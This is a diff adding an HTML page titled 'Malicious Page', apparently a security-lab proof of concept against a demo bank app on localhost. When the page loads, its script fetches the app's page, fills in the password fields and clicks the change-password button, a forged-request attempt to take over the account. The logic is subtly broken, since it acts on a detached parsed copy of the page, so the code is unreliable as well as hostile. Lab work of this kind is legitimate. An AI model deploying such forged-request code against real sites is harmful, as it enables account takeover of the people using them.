@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious Page</title>
+</head>
+<body>
+    <script>
+        function loadBankApp() {
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', 'http://localhost:8000/BankApp2.html', true);
+            xhr.onload = function() {
+                const bankAppHtml = this.responseText;
+                const parser = new DOMParser();
+                const bankAppDoc = parser.parseFromString(bankAppHtml, 'text/html');
+
+                // Perform actions on the BankApp2.html here,
+                // such as logging in, changing password, or viewing user image.
+
+                // For example, to change the password:
+                const oldPasswordInput = bankAppDoc.querySelector('#old-password');
+                const newPasswordInput = bankAppDoc.querySelector('#new-password');
+
+                oldPasswordInput.value = 'old-password';
+                newPasswordInput.value = 'new-password';
+
+                const changePasswordButton = bankAppDoc.querySelector('#changePassword');
+                changePasswordButton.click();
+            };
+            xhr.send();
+        }
+
+        loadBankApp();
+    </script>
+</body>
+</html>
